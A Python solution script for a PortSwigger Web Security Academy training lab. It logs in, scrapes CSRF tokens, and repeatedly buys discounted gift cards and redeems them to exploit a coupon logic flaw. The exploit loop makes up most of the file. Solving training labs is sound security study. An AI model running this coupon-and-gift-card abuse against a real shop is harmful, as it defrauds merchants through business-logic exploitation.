import requests
from bs4 import BeautifulSoup

'''
A simple script written to solve "Lab: Infinite money logic flaw" - Portswigger Web Security Academy.
Remember to replace part of the link with your lab ID in all requests
Written by Julia Zduńczyk
'''


session = requests.session()

# Login
login = session.get('https://<your lab ID>.web-security-academy.net/login', verify=False)
content = login.content.decode()
soup = BeautifulSoup(content, features="html.parser")
csrf_token = soup.find('input', {'name': 'csrf'}).get('value')
params = {
    "csrf": csrf_token,
    "username" : "wiener",
    "password" : "peter"
}
account = session.post('https://<your lab ID>.web-security-academy.net/login', data=params, verify=False)
# Obtaining a token that will be used in the next requests
content = account.content.decode()
soup = BeautifulSoup(content, features="html.parser")
csrf_token = soup.find('input', {'name': 'csrf'}).get('value')

# For each pass of the loop we get 3$
for i in range(300):

    # Add gift card to a cart
    params = {
        "productId": '2',
        "redir" : "PRODUCT",
        "quantity" : '1'
    }
    session.post('https://<your lab ID>.web-security-academy.net/cart', data=params, verify=False)

    params = {
        "csrf": csrf_token,
        "coupon" : "SIGNUP30"
    }
    # Add coupon to the cart
    session.post('https://<your lab ID>.web-security-academy.net/cart/coupon', data=params, verify=False)

    params = {
        "csrf": csrf_token
    }
    # Buy gift card
    response = session.post('https://<your lab ID>.web-security-academy.net/cart/checkout', data=params, verify=False)
    content = response.content.decode()
    soup = BeautifulSoup(content, features="html.parser")
    card_code = soup.find('table', {'class': 'is-table-numbers'}).get_text(strip=True)
    card_code = card_code[4:]

    params = {
        "csrf": csrf_token,
        "gift-card": card_code
    }
    # Redeem the gift-card code
    session.post('https://<your lab ID>.web-security-academy.net/gift-card', data=params, verify=False)

# Now buy the leather jacket
params = {
    "productId": '1',
    "redir" : "PRODUCT",
    "quantity" : '1'
}
session.post('https://<your lab ID>.web-security-academy.net/cart', data=params, verify=False)
params = {
    "csrf": csrf_token,
    "coupon" : "SIGNUP30"
}
# Add coupon to the cart
session.post('https://<your lab ID>.web-security-academy.net/cart/coupon', data=params, verify=False)
session.post('https://<your lab ID>.web-security-academy.net/cart/checkout', data=params, verify=False)